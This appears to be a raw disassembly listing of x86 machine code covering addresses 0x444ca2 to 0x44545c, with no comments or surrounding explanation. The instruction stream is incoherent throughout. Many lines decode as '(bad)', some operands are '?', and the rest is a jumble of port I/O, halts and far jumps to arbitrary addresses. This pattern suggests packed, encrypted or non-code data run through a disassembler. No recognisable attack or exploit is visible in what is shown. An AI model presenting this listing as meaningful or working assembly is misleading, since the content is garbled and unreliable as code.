  444ca2:	adc    edx,0x10
  444ca5:	mov    ah,0x85
  444ca7:	push   0xffffffd8
  444ca9:	mov    ah,0xdc
  444cab:	and    BYTE PTR [ebp+0x25],dh
  444cae:	or     al,BYTE PTR [edx]
  444cb0:	xor    al,0x2a
  444cb2:	mov    ah,0xd6
  444cb4:	rol    BYTE PTR [esi],cl
  444cb6:	xor    DWORD PTR [edx-0x2f205986],ebp
  444cbc:	inc    dx
  444cbe:	lds    eax,FWORD PTR [eax]
  444cc0:	(bad)  
  444cc1:	inc    DWORD PTR [esi+0x6b454290]
  444cc7:	jbe    0x444c94
  444cc9:	push   edx
  444cca:	mov    bh,0xbe
  444ccc:	ret    0x63b5
  444ccf:	inc    edx
  444cd0:	lods   eax,DWORD PTR ds:[esi]
  444cd1:	call   0x3c4df900
  444cd6:	ficomp WORD PTR [esi-0x9]
  444cd9:	mov    ah,0xd7
  444cdb:	xor    al,0xb0
  444cdd:	sbb    al,0x63
  444cdf:	cmp    eax,DWORD PTR [edi+eiz*8+0x4f0e46d4]
  444ce6:	sbb    DWORD PTR [edi],ecx
  444ce8:	or     al,dl
  444cea:	mov    cl,0xcc
  444cec:	or     al,0x51
  444cee:	fwait
  444cef:	and    BYTE PTR [edx-0x391fc1f7],0x57
  444cf6:	jno    0x444d6f
  444cf8:	nop
  444cf9:	cmp    eax,0x137ef1b0
  444cfe:	arpl   WORD PTR [ebx+eiz*2],di
  444d01:	mov    ah,0xd6
  444d03:	clc    
  444d04:	or     BYTE PTR [ebx+0x149c1488],ch
  444d0a:	cmp    al,0x4e
  444d0c:	retf   
  444d0d:	adc    al,0x1e
  444d0f:	or     eax,DWORD PTR [ecx+esi*2-0x2d]
  444d13:	sub    bh,BYTE PTR [eax]
  444d15:	and    al,dh
  444d17:	xor    BYTE PTR [ebp-0x33],ch
  444d1a:	pop    esi
  444d1b:	pop    edi
  444d1c:	scas   al,BYTE PTR es:[edi]
  444d1d:	xchg   DWORD PTR [ebx+0x7692340c],esi
  444d23:	xor    ebp,DWORD PTR [edx-0x1dbc4acc]
  444d29:	jb     0x444d80
  444d2b:	sub    BYTE PTR [esi+0x77be9cd0],al
  444d31:	mov    ch,0x5
  444d33:	popf   
  444d34:	jbe    0x444d26
  444d36:	call   0x9674ee50
  444d3b:	and    BYTE PTR [edi-0x3ab77712],0x90
  444d42:	sbb    ah,bh
  444d44:	lods   eax,DWORD PTR ds:[esi]
  444d45:	lods   al,BYTE PTR ds:[esi]
  444d46:	adc    al,BYTE PTR es:[edi-0x6c]
  444d4a:	pop    esi
  444d4b:	mov    BYTE PTR [edi+0x382052ae],cl
  444d51:	test   BYTE PTR ss:[edx],ch
  444d54:	into   
  444d55:	clc    
  444d56:	push   ds
  444d57:	dec    esi
  444d58:	mov    esi,0x6e86d2c
  444d5d:	mov    DWORD PTR [esi*4-0x7fc34511],edx
  444d64:	push   ss
  444d65:	cmp    esp,edx
  444d67:	or     cl,BYTE PTR [ebx+0x4e]
  444d6a:	xor    dl,0x41
  444d6d:	ror    DWORD PTR [ecx],0x9
  444d70:	movups xmm7,xmm7
  444d73:	mov    ah,0x5
  444d75:	dec    esi
  444d76:	cmp    DWORD PTR [eax-0x78],eax
  444d79:	and    al,al
  444d7b:	retf   
  444d7c:	add    DWORD PTR [ebp+0x209245e6],0xa7cf009d
  444d86:	adc    al,0xe0
  444d88:	adc    edx,esi
  444d8a:	push   es
  444d8b:	push   cs
  444d8c:	pop    ebx
  444d8d:	rcr    esi,cl
  444d8f:	rcr    DWORD PTR [ebx],cl
  444d91:	sub    DWORD PTR [esp+esi*4],ebp
  444d94:	and    al,0xf
  444d96:	in     al,0xa6
  444d98:	sbb    BYTE PTR [eax-0xbcd78e7],ah
  444d9e:	sbb    DWORD PTR [ebx+esi*2],ecx
  444da1:	or     dh,BYTE PTR [edx+0x4f347404]
  444da7:	mov    ah,0x1
  444da9:	les    edx,FWORD PTR [edi-0x79]
  444dac:	push   0x42
  444dae:	sub    cl,BYTE PTR [ecx-0x2c]
  444db1:	mov    bh,0xd4
  444db3:	sub    BYTE PTR [esi+ebx*2+0x4871e406],dl
  444dba:	mov    ds:0x84f67a51,al
  444dbf:	mov    edi,0xd6b4542d
  444dc4:	dec    esi
  444dc5:	xchg   esp,eax
  444dc6:	adc    BYTE PTR [edi],dh
  444dc8:	call   0xa8b3:0x42d7e299
  444dcf:	xchg   ebx,eax
  444dd0:	lods   eax,DWORD PTR ds:[esi]
  444dd1:	adc    esi,edx
  444dd3:	fwait
  444dd4:	cs inc ecx
  444dd6:	mov    DWORD PTR [esi-0x2ad5fd03],esp
  444ddc:	sub    al,0x0
  444dde:	xchg   esi,eax
  444ddf:	mov    esi,0x44384ecf
  444de4:	es leave 
  444de6:	mov    dh,0x16
  444de8:	push   eax
  444de9:	rcr    BYTE PTR [eax],1
  444deb:	test   eax,0x92ba722d
  444df0:	pop    esp
  444df1:	sub    BYTE PTR [edx],ah
  444df3:	xor    dl,BYTE PTR [esi+0x6d]
  444df6:	mov    eax,ds:0x3df49a35
  444dfb:	or     bl,BYTE PTR [edx-0x28]
  444dfe:	ins    DWORD PTR es:[edi],dx
  444dff:	lods   eax,DWORD PTR ds:[esi]
  444e00:	push   ebp
  444e01:	inc    edx
  444e02:	mov    DWORD PTR [esi+0x46],esi
  444e05:	out    0x64,al
  444e07:	mov    cl,0xda
  444e09:	and    ecx,DWORD PTR [ebx]
  444e0b:	mov    al,0x4d
  444e0d:	test   eax,0x42c6e5c4
  444e12:	popf   
  444e13:	push   ss
  444e14:	in     al,dx
  444e15:	mov    bh,0x9e
  444e17:	hlt    
  444e18:	test   BYTE PTR [eax+0x6a],cl
  444e1b:	xchg   edi,eax
  444e1c:	rol    BYTE PTR [edi-0x46],1
  444e1f:	sub    ecx,ecx
  444e21:	fiadd  WORD PTR [ebx]
  444e23:	(bad)  
  444e24:	sbb    al,0xd
  444e26:	ins    BYTE PTR es:[edi],dx
  444e27:	stos   BYTE PTR es:[edi],al
  444e28:	test   al,0xae
  444e2a:	xchg   DWORD PTR [ebx+edi*8-0x73de3e2a],edx
  444e31:	sbb    BYTE PTR [ebx],dl
  444e33:	das    
  444e34:	aam    0x93
  444e36:	or     BYTE PTR [eax],bl
  444e38:	sbb    BYTE PTR [edx-0x17d62a3],0x21
  444e3f:	out    0xbf,al
  444e41:	loop   0x444e38
  444e43:	stos   BYTE PTR es:[edi],al
  444e44:	adc    bh,BYTE PTR [edx+0x24e52e82]
  444e4a:	mov    dl,0x89
  444e4c:	pop    edx
  444e4d:	jno    0x444e4f
  444e4f:	and    al,0x81
  444e51:	inc    esi
  444e52:	adc    bh,BYTE PTR [esi]
  444e54:	or     al,0xf8
  444e56:	xor    al,0x5e
  444e58:	and    dl,dl
  444e5a:	and    esp,esp
  444e5c:	pop    dx
  444e5e:	and    BYTE PTR [edx+ecx*2],bl
  444e61:	or     ebp,DWORD PTR [eax-0x5e772d71]
  444e67:	imul   ecx,ebp,0x1
  444e6a:	ret    
  444e6b:	or     al,0xd8
  444e6d:	jbe    0x444e7a
  444e6f:	call   0xd2c4cae0
  444e74:	and    ebp,DWORD PTR [ecx+0xd]
  444e77:	pusha  
  444e78:	in     al,dx
  444e79:	in     eax,0x56
  444e7b:	or     al,0x3c
  444e7d:	xchg   ch,dh
  444e7f:	(bad)  
  444e80:	call   0xa5eba53e
  444e85:	sub    ecx,DWORD PTR [eax]
  444e87:	fdiv   DWORD PTR [eax+0x8]
  444e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444e8b:	mov    dh,0xb7
  444e8d:	xor    al,0xc6
  444e8f:	push   ss
  444e90:	pop    esp
  444e91:	add    al,al
  444e93:	cli    
  444e94:	leave  
  444e95:	test   BYTE PTR [ebx-0x4],al
  444e98:	mov    ebx,0xdf584e50
  444e9d:	xchg   esp,eax
  444e9e:	sbb    ch,BYTE PTR [esi+ebx*1-0x5b6a2918]
  444ea5:	fmul   QWORD PTR [edx+0x4653093]
  444eab:	mov    dh,0x47
  444ead:	sbb    ah,BYTE PTR [esi]
  444eaf:	sbb    DWORD PTR [edx-0x2a7e9659],eax
  444eb5:	es push esi
  444eb7:	retf   0x20fe
  444eba:	std    
  444ebb:	je     0x444edd
  444ebd:	loop   0x444e72
  444ebf:	out    0x6,al
  444ec1:	push   eax
  444ec2:	xor    BYTE PTR [edi-0x1f],ah
  444ec5:	adc    esi,DWORD PTR [ecx-0x52f17f98]
  444ecb:	in     eax,dx
  444ecc:	cli    
  444ecd:	adc    eax,esi
  444ecf:	add    ebp,DWORD PTR [ebx]
  444ed1:	push   cs
  444ed2:	inc    eax
  444ed3:	mov    ds,WORD PTR [edi+0x24c6600a]
  444ed9:	mov    ds:0x7c965eca,eax
  444ede:	cli    
  444edf:	mov    dl,0xa8
  444ee1:	add    DWORD PTR [edx],eax
  444ee3:	fisub  DWORD PTR [ecx-0x5d5b932f]
  444ee9:	gs sbb al,0xa4
  444eec:	pop    edx
  444eed:	dec    edx
  444eee:	push   0xffffff85
  444ef0:	pushf  
  444ef1:	or     ah,BYTE PTR [eax-0x176b3098]
  444ef7:	pop    es
  444ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444ef9:	(bad)  
  444efa:	loop   0x444ee6
  444efc:	out    dx,al
  444efd:	(bad)
  444f00:	push   es
  444f01:	mov    ch,0xd0
  444f03:	icebp  
  444f04:	and    al,0xaa
  444f06:	imul   esp,DWORD PTR [esi+0x7a],0xffffffc2
  444f0a:	add    ch,ch
  444f0c:	mov    eax,DWORD PTR [esi+0x25]
  444f0f:	(bad)  
  444f10:	out    0x64,eax
  444f12:	iret   
  444f13:	stos   BYTE PTR es:[edi],al
  444f14:	mov    gs,WORD PTR [eax-0x1d880196]
  444f1a:	or     al,0x72
  444f1c:	add    al,0x3c
  444f1e:	shr    DWORD PTR [edx+0x22],1
  444f21:	hlt    
  444f22:	mov    ecx,0x1fac08c4
  444f27:	add    al,0x56
  444f29:	jbe    0x444ee1
  444f2b:	fdiv   QWORD PTR [ebx+ebx*4]
  444f2e:	test   BYTE PTR [esi+0x25],bh
  444f31:	call   0x28438737
  444f36:	xor    BYTE PTR [esi-0x3aebff54],0xa4
  444f3d:	xchg   esp,eax
  444f3e:	adc    BYTE PTR [eax+0x7a10b264],cl
  444f44:	and    BYTE PTR [eax],cl
  444f46:	jp     0x444f81
  444f48:	adc    ah,BYTE PTR [ecx]
  444f4a:	loopne 0x444ee3
  444f4c:	icebp  
  444f4d:	cwde   
  444f4e:	cmp    bl,ch
  444f50:	cs es adc eax,0x759461b7
  444f57:	fmul   DWORD PTR [eax-0x7f7d7f4e]
  444f5d:	es xor al,0x58
  444f60:	aad    0x80
  444f62:	mov    al,ds:0x38993587
  444f67:	push   cs
  444f68:	retf   0xe1b6
  444f6b:	call   0x8a2821e
  444f70:	pop    ebx
  444f71:	les    esi,FWORD PTR [ebx+edi*2]
  444f74:	fwait
  444f75:	mov    dh,0x25
  444f77:	movq   mm4,QWORD PTR [ecx+0x6b]
  444f7b:	lahf   
  444f7c:	push   esp
  444f7d:	arpl   dx,sp
  444f7f:	mov    bl,0x52
  444f81:	sub    al,0xa4
  444f83:	cs xchg edx,eax
  444f85:	push   edx
  444f86:	adc    edx,eax
  444f88:	xchg   DWORD PTR [esi+ecx*2],edi
  444f8b:	or     DWORD PTR [edi+0x10],ebx
  444f8e:	jle    0x444f34
  444f90:	aam    0x2c
  444f92:	hlt    
  444f93:	jne    0x44500d
  444f95:	dec    ebp
  444f96:	ins    DWORD PTR es:[edi],dx
  444f97:	or     dh,BYTE PTR [eax+0x24c9b546]
  444f9d:	aad    0x28
  444f9f:	or     DWORD PTR [esp+ebx*1],edx
  444fa2:	nop
  444fa3:	mov    dh,0x4b
  444fa5:	test   dl,0xb5
  444fa8:	xchg   edi,eax
  444fa9:	test   BYTE PTR [edx+0x52aa55ac],bh
  444faf:	or     DWORD PTR [ebx+ebx*2+0xb],edi
  444fb3:	ror    BYTE PTR [esi],1
  444fb5:	add    eax,0x1d76bd92
  444fba:	out    dx,al
  444fbb:	pop    edx
  444fbc:	inc    esi
  444fbd:	repz mov cs,WORD PTR [ebx+0x34]
  444fc1:	aaa    
  444fc2:	mov    ah,0xb9
  444fc4:	js     0x445037
  444fc6:	add    BYTE PTR [eax],al
  444fc8:	shr    BYTE PTR [eax],1
  444fca:	pop    eax
  444fcb:	rcr    DWORD PTR [edx-0x75],1
  444fce:	cli    
  444fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444fd0:	jbe    0x445019
  444fd2:	fs hlt 
  444fd4:	sbb    ah,ah
  444fd6:	jnp    0x444f85
  444fd8:	mov    ds:0x212491e,eax
  444fdd:	xchg   esp,eax
  444fde:	sbb    BYTE PTR [eax+0x1c58d9f6],cl
  444fe4:	pop    es
  444fe5:	iret   
  444fe6:	cli    
  444fe7:	sub    eax,0x83cff4f7
  444fec:	das    
  444fed:	loopne 0x444f96
  444fef:	push   edx
  444ff0:	imul   esp,DWORD PTR [esi],0xffffffee
  444ff3:	lods   eax,DWORD PTR ds:[esi]
  444ff4:	mov    dl,ah
  444ff6:	xor    al,0xae
  444ff8:	test   DWORD PTR [ebx-0x7a7309e0],eax
  444ffe:	arpl   WORD PTR [ebx+0xb],bx
  445001:	scas   al,BYTE PTR es:[edi]
  445002:	and    DWORD PTR [esi+0x1354e038],edx
  445008:	or     al,0x17
  44500a:	outs   dx,BYTE PTR ds:[esi]
  44500b:	push   0x68
  44500d:	or     bl,BYTE PTR [ecx]
  44500f:	in     eax,dx
  445010:	retf   
  445011:	or     BYTE PTR [ebx+0x3d842b10],dl
  445017:	xchg   edx,eax
  445018:	test   BYTE PTR [ebp-0x3e],bl
  44501b:	pop    esi
  44501c:	(bad)  
  44501d:	and    al,0xb8
  44501f:	lahf   
  445020:	jp     0x444fc4
  445022:	fwait
  445023:	test   BYTE PTR [edx],ah
  445025:	ret    0x2ce
  445028:	cld    
  445029:	test   BYTE PTR [esi],dh
  44502b:	mov    ch,BYTE PTR [edx+esi*2]
  44502e:	push   esi
  44502f:	stos   BYTE PTR es:[edi],al
  445030:	scas   al,BYTE PTR es:[edi]
  445031:	and    eax,0x14cda35a
  445036:	ins    BYTE PTR es:[edi],dx
  445037:	mov    bh,0x58
  445039:	xchg   esi,eax
  44503a:	adc    eax,0x1c52e681
  44503f:	test   al,0x6
  445041:	mov    cl,0xa
  445043:	test   BYTE PTR [ebp-0x4],0x9e
  445047:	jmp    0x8ca6:0x35218154
  44504e:	(bad)  
  44504f:	(bad)  
  445050:	and    eax,0x6e8450f0
  445055:	mov    al,ds:0x27addb7c
  44505a:	adc    BYTE PTR [ebp+0x3e],cl
  44505d:	nop
  44505e:	into   
  44505f:	jne    0x44506d
  445061:	lods   al,BYTE PTR ds:[esi]
  445062:	int    0xa
  445064:	pop    DWORD PTR es:[esi-0x66]
  445068:	cli    
  445069:	in     eax,dx
  44506a:	hlt    
  44506b:	push   esp
  44506c:	popa   
  44506d:	or     esp,DWORD PTR [eax-0x70]
  445070:	shr    esi,cl
  445072:	xchg   esp,eax
  445073:	inc    eax
  445074:	cwde   
  445075:	test   BYTE PTR [ecx+0x42],0xb5
  445079:	dec    esp
  44507a:	(bad)  
  44507b:	nop
  44507c:	xor    eax,0xfb2216e0
  445081:	and    DWORD PTR [esi+ebx*2-0x4e],ebp
  445085:	add    dl,dh
  445087:	retf   0xbe05
  44508a:	xchg   BYTE PTR [ebx],dh
  44508c:	sbb    DWORD PTR [edi],0x8ea26dd0
  445092:	add    edx,DWORD PTR [esi+ebp*4-0x3e96292e]
  445099:	sbb    edx,ebp
  44509b:	inc    esp
  44509c:	mov    edi,ebp
  44509e:	and    esi,DWORD PTR [eax-0xd]
  4450a1:	lahf   
  4450a2:	cmp    al,BYTE PTR [edx]
  4450a4:	cmc    
  4450a5:	push   ebx
  4450a6:	loop   0x4450f9
  4450a8:	push   edx
  4450a9:	fiadd  DWORD PTR [edx]
  4450ab:	push   ecx
  4450ac:	push   eax
  4450ad:	push   ecx
  4450ae:	push   0x4
  4450b0:	sahf   
  4450b1:	push   eax
  4450b2:	clc    
  4450b3:	and    BYTE PTR [edx+edx*1-0x3e],ch
  4450b7:	mov    eax,0xbe669ad1
  4450bc:	ficom  DWORD PTR [ebx]
  4450be:	or     al,0x62
  4450c0:	ret    
  4450c1:	or     al,0x50
  4450c3:	pop    esp
  4450c4:	test   DWORD PTR [edi],eax
  4450c6:	xor    al,0x36
  4450c8:	loop   0x445056
  4450ca:	or     bl,BYTE PTR [eax+0x26]
  4450cd:	xchg   ebx,eax
  4450ce:	pop    edx
  4450cf:	sub    ebp,DWORD PTR [ebp+edi*1-0x14]
  4450d3:	js     0x4450eb
  4450d5:	popf   
  4450d6:	mov    al,0xa1
  4450d8:	enter  0x687e,0x48
  4450dc:	cmovl  edi,DWORD PTR [esi]
  4450df:	mov    ?,WORD PTR [eax]
  4450e1:	test   al,0x66
  4450e3:	dec    eax
  4450e4:	adc    eax,0x5d440297
  4450e9:	or     al,BYTE PTR [ebp+0x35acd433]
  4450ef:	enter  0x7c67,0x70
  4450f3:	mov    dl,0xa0
  4450f5:	push   0xffffffc6
  4450f7:	js     0x445119
  4450f9:	jbe    0x445154
  4450fb:	sub    BYTE PTR [eax-0x32],bl
  4450fe:	dec    ebp
  4450ff:	push   cs
  445100:	sbb    dh,dl
  445102:	cvtpd2pi mm5,XMMWORD PTR [ebp+0x382d4c22]
  44510a:	fdivp  st(2),st
  44510c:	cs call 0xd45bd5a9
  445112:	add    eax,0xa95db47f
  445117:	dec    eax
  445118:	mov    WORD PTR [edx-0x4f121cfd],cs
  44511e:	outs   dx,BYTE PTR ds:[esi]
  44511f:	sbb    al,0x12
  445121:	aad    0x12
  445123:	int    0x49
  445125:	mov    BYTE PTR [esp+eax*8],bl
  445128:	mov    dl,0x9b
  44512a:	add    al,0xad
  44512c:	inc    ecx
  44512d:	push   cs
  44512e:	or     BYTE PTR [eax-0x359ad7c],al
  445134:	sbb    al,0x8
  445136:	sub    BYTE PTR [edx+esi*2],dh
  445139:	enter  0x22fe,0x74
  44513d:	cwde   
  44513e:	add    al,0x14
  445140:	dec    esi
  445141:	ins    DWORD PTR es:[edi],dx
  445142:	add    BYTE PTR [eax-0x74],ah
  445145:	call   0x24fa:0x9e36386c
  44514c:	lock lods al,BYTE PTR ds:[esi]
  44514e:	dec    esi
  44514f:	push   eax
  445150:	dec    ecx
  445151:	dec    edi
  445152:	mov    al,ds:0xf412a24c
  445157:	dec    esp
  445158:	adc    al,0x81
  44515a:	mov    di,0x500e
  44515e:	xor    ah,0x10
  445161:	fimul  DWORD PTR [esi-0x64eb8f16]
  445167:	jle    0x4451d6
  445169:	adc    ecx,DWORD PTR [ebx+0x62fefc7a]
  44516f:	call   0xe6a86a02
  445174:	and    ebx,ecx
  445176:	push   ds
  445177:	inc    edx
  445178:	bound  ebx,QWORD PTR [ecx+0x48]
  44517b:	mov    eax,0xe925f495
  445180:	and    dh,BYTE PTR [eax-0x53c145be]
  445186:	push   esi
  445187:	and    eax,0x782eaaf6
  44518c:	cmp    dl,BYTE PTR [ebx+0x1a264d1d]
  445192:	inc    BYTE PTR [edx-0x73516332]
  445198:	mov    al,ds:0x761b27ae
  44519d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44519e:	repnz dec cx
  4451a1:	les    ecx,FWORD PTR [edx]
  4451a3:	mov    cl,0x58
  4451a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4451a6:	in     eax,dx
  4451a7:	das    
  4451a8:	sub    al,0x70
  4451aa:	xor    al,0xe9
  4451ac:	call   0x77c810
  4451b1:	test   BYTE PTR [ecx],cl
  4451b3:	jg     0x445224
  4451b5:	inc    edx
  4451b6:	(bad)  
  4451b7:	and    eax,0x90d5164c
  4451bc:	mov    ds:0xb7d608e2,eax
  4451c1:	sub    edi,DWORD PTR [edx]
  4451c3:	sub    eax,0xec21e746
  4451c8:	xor    DWORD PTR [esp+ecx*1+0x7a82730d],esi
  4451cf:	mov    ecx,0x89ab6edc
  4451d4:	imul   esi,DWORD PTR ds:0x16c0acd6,0xa361f8a3
  4451de:	xor    eax,0x170afe8c
  4451e3:	jmp    0x997d:0x62ad29e1
  4451ea:	add    BYTE PTR [eax+0x78],ch
  4451ed:	cmp    eax,0xb7d74343
  4451f2:	or     BYTE PTR [eax+eax*4],ch
  4451f5:	inc    ecx
  4451f6:	push   esi
  4451f7:	xchg   ecx,eax
  4451f8:	into   
  4451f9:	mov    al,ds:0x72615ac3
  4451fe:	and    ch,al
  445200:	mov    BYTE PTR [esi],dl
  445202:	call   0xf6ef0238
  445207:	jmp    0xe05cb0a2
  44520c:	or     al,0xf6
  44520e:	scas   al,BYTE PTR es:[edi]
  44520f:	sub    ecx,DWORD PTR [edx]
  445211:	fwait
  445212:	push   cs
  445213:	out    dx,al
  445214:	xchg   edx,eax
  445215:	outs   dx,DWORD PTR ds:[esi]
  445216:	dec    eax
  445217:	jle    0x445221
  445219:	pop    ss
  44521a:	push   esi
  44521b:	xchg   ecx,eax
  44521c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44521d:	mov    ds:0xe3bcb118,al
  445222:	adc    ebx,DWORD PTR ds:0x4cd4458a
  445228:	push   0xffffffa0
  44522a:	or     al,0x81
  44522c:	test   eax,0x6e322a10
  445231:	je     0x445276
  445233:	mov    WORD PTR [ebx+0x1f],?
  445236:	pop    ebx
  445237:	cli    
  445238:	fs mov esp,0x6e40d8cd
  44523e:	retf   
  44523f:	add    BYTE PTR [ecx+eax*8-0x40],bl
  445243:	scas   al,BYTE PTR es:[edi]
  445244:	xlat   BYTE PTR ds:[ebx]
  445245:	into   
  445246:	jp     0x4451e4
  445248:	call   0x686c7e93
  44524d:	inc    edx
  44524e:	pop    esp
  44524f:	xchg   esp,eax
  445250:	mov    eax,0x772ab360
  445255:	gs jl  0x445268
  445258:	pop    ds
  445259:	sub    eax,0x84d127a4
  44525e:	jge    0x445200
  445260:	int    0xba
  445262:	push   esi
  445263:	cmp    al,BYTE PTR [esi+ebx*4]
  445266:	or     BYTE PTR [esi+0x54df5e8e],ah
  44526c:	test   al,0x7
  44526e:	inc    ecx
  44526f:	lahf   
  445270:	push   cs
  445271:	jecxz  0x44524d
  445273:	js     0x4452a0
  445275:	retf   0x5a12
  445278:	or     DWORD PTR [eax-0x7ce9b998],0xffffffd4
  44527f:	inc    eax
  445280:	loopne 0x445296
  445282:	fist   WORD PTR [eax-0x42d45582]
  445288:	aam    0x88
  44528a:	pop    esi
  44528b:	push   ebx
  44528c:	sub    al,0x6c
  44528e:	adc    ch,BYTE PTR [edx]
  445290:	mov    al,ds:0x4b046c8a
  445295:	push   eax
  445296:	ffree  st(4)
  445298:	xor    eax,DWORD PTR [edi+ebx*1+0x6aad2734]
  44529f:	or     DWORD PTR ds:0x46adaf4,ecx
  4452a5:	(bad)  
  4452a6:	stos   BYTE PTR es:[edi],al
  4452a7:	pcmpeqd mm2,QWORD PTR [eax+0x41ab417e]
  4452ae:	call   0x233c:0xd2a2e599
  4452b5:	mov    DWORD PTR [edi-0x7e],eax
  4452b8:	nop
  4452b9:	test   eax,0xf6a64a3b
  4452be:	and    ebx,esp
  4452c0:	pop    ss
  4452c1:	mov    al,0xb6
  4452c3:	test   DWORD PTR [edi+ebx*4-0x351294ba],edx
  4452ca:	rcr    BYTE PTR [ecx+esi*2-0x41dd6b7c],0x8e
  4452d2:	test   al,0xd6
  4452d4:	add    ecx,DWORD PTR [ebx]
  4452d6:	pop    edx
  4452d7:	inc    ecx
  4452d8:	mov    ch,0x54
  4452da:	jg     0x4452ca
  4452dc:	push   ebp
  4452dd:	test   al,0x57
  4452df:	push   edi
  4452e0:	mov    esi,0x2ee246a8
  4452e5:	pop    ds
  4452e6:	fcom   DWORD PTR [eax]
  4452e8:	(bad)  
  4452e9:	dec    edx
  4452ea:	loopne 0x445284
  4452ec:	(bad)  
  4452ed:	(bad)  
  4452ee:	sub    BYTE PTR [esp+edx*4-0x699f9db1],0xa4
  4452f6:	pop    ebp
  4452f7:	add    eax,0x46c2c6ad
  4452fc:	test   ah,0x1e
  4452ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445300:	mov    BYTE PTR [eax+0x23e2497a],bh
  445306:	fcomp  QWORD PTR [eax+0x5a86a0f5]
  44530c:	mov    al,0x49
  44530e:	ret    0x640a
  445311:	pop    esp
  445312:	jge    0x4452e7
  445314:	call   0xcce8:0x3c4d4d1b
  44531b:	cli    
  44531c:	jmp    0x445322
  44531e:	jl     0x44538f
  445320:	ins    BYTE PTR es:[edi],dx
  445321:	or     dl,BYTE PTR [ebp-0x50]
  445324:	outs   dx,BYTE PTR ds:[esi]
  445325:	arpl   WORD PTR [eax],bp
  445327:	or     ecx,DWORD PTR [ebx]
  445329:	lock add BYTE PTR [edi],dh
  44532c:	fs mov cl,0xdc
  44532f:	push   es
  445330:	pop    esi
  445331:	sbb    bh,BYTE PTR [eax-0x58]
  445334:	xor    edx,DWORD PTR [edi+0x2bee897a]
  44533a:	jne    0x445397
  44533c:	iret   
  44533d:	jp     0x4453a3
  44533f:	cmp    bl,BYTE PTR [edx]
  445341:	adc    dh,BYTE PTR [esi-0x5b3d27c3]
  445347:	loop   0x4452c9
  445349:	adc    al,0x40
  44534b:	jbe    0x4453b7
  44534d:	and    BYTE PTR [ebx+edi*4+0x5],0x8a
  445352:	add    al,0x70
  445354:	mov    edx,0xcaa14ef2
  445359:	jb     0x4453b3
  44535b:	ss daa 
  44535d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44535e:	add    dh,bl
  445360:	mov    dh,0x7c
  445362:	xchg   ebp,eax
  445364:	xchg   edi,eax
  445365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445366:	iret   
  445367:	xchg   esi,eax
  445368:	sbb    BYTE PTR [eax+eax*4+0x6d76a8a4],bh
  44536f:	jmp    0x4216:0x2a649d4e
  445376:	mov    dh,0xa0
  445378:	enter  0x560a,0xbf
  44537c:	mov    dl,0x9e
  44537e:	mov    ebp,0x94d1ecfc
  445383:	cmp    BYTE PTR [esi-0x3ab5f27f],al
  445389:	xor    ecx,edx
  44538b:	clc    
  44538c:	icebp  
  44538d:	ins    BYTE PTR es:[edi],dx
  44538e:	adc    eax,0xd8c6bad8
  445393:	sub    al,BYTE PTR [eax]
  445395:	icebp  
  445396:	inc    ebx
  445397:	pop    edx
  445398:	add    al,0x1a
  44539a:	rcr    dh,1
  44539c:	cwde   
  44539d:	dec    edi
  44539e:	or     ebp,DWORD PTR [edi-0x49e543d7]
  4453a4:	inc    esp
  4453a5:	xchg   esp,eax
  4453a6:	cmp    BYTE PTR [esi],bh
  4453a8:	pop    esi
  4453a9:	cmp    DWORD PTR [eax+0x2d],0x4e
  4453ad:	and    DWORD PTR [eax-0xe],ecx
  4453b0:	jns    0x4453a7
  4453b2:	or     cl,ah
  4453b4:	xchg   ebx,eax
  4453b5:	aad    0xe8
  4453b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4453b8:	sahf   
  4453b9:	xchg   ebx,eax
  4453ba:	(bad)  
  4453bc:	jle    0x4453d0
  4453be:	cli    
  4453bf:	push   cs
  4453c0:	push   esp
  4453c1:	sbb    DWORD PTR [edx+0x54],edx
  4453c4:	jns    0x4453a8
  4453c6:	jmp    0x44537d
  4453c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4453c9:	add    dl,BYTE PTR [esi]
  4453cb:	jg     0x44539b
  4453cd:	ficom  WORD PTR [ecx-0x6b]
  4453d0:	mov    eax,ds:0x7f2c6076
  4453d5:	jbe    0x44535f
  4453d7:	(bad)  
  4453d8:	ins    BYTE PTR es:[edi],dx
  4453d9:	stos   BYTE PTR es:[edi],al
  4453da:	popf   
  4453db:	and    BYTE PTR [ecx+0xa064aa7],bl
  4453e1:	mov    BYTE PTR [esi+0x48],bl
  4453e4:	fwait
  4453e5:	sahf   
  4453e6:	sub    al,0xba
  4453e8:	pushf  
  4453e9:	jbe    0x4453fb
  4453eb:	pop    gs
  4453ed:	rol    BYTE PTR [esp+ebx*2-0x72],0x29
  4453f2:	inc    esi
  4453f3:	not    BYTE PTR [edi]
  4453f5:	mov    bl,0x17
  4453f7:	xor    BYTE PTR [eax-0x77dd5fde],0x4c
  4453fe:	xor    eax,0x4b1d64f4
  445403:	pop    ebx
  445404:	inc    ebp
  445405:	lods   eax,DWORD PTR ds:[esi]
  445406:	cmp    bh,cl
  445408:	inc    esi
  445409:	and    bh,dl
  44540b:	dec    eax
  44540c:	mov    al,ds:0xa8a3adf3
  445411:	mov    esi,0xc66caae7
  445416:	sub    ebx,esp
  445418:	lahf   
  445419:	add    BYTE PTR [eax],0xb9
  44541c:	sbb    cl,BYTE PTR [ebx]
  44541e:	add    al,0x5a
  445420:	inc    ebp
  445421:	fwait
  445422:	push   edx
  445423:	mov    esi,esp
  445425:	aad    0xc5
  445427:	mov    bl,0xd5
  445429:	icebp  
  44542a:	inc    esi
  44542b:	adc    al,BYTE PTR [edi+0x1cba2b4e]
  445431:	pop    eax
  445432:	xchg   esp,eax
  445433:	lods   al,BYTE PTR ds:[esi]
  445434:	add    BYTE PTR [edx+0x25],0x66
  445438:	mov    ebx,0x36615ac4
  44543d:	pushf  
  44543e:	jb     0x4453c8
  445440:	cmp    cl,BYTE PTR [edi+0x5c540543]
  445446:	or     ch,BYTE PTR [eax+0x3c64e5]
  44544c:	mov    ebp,0x325532
  445451:	mov    edx,0x6ba50bf0
  445456:	add    DWORD PTR [edi+0x6d2aa36],ebx
  44545c:	ja     0x445410
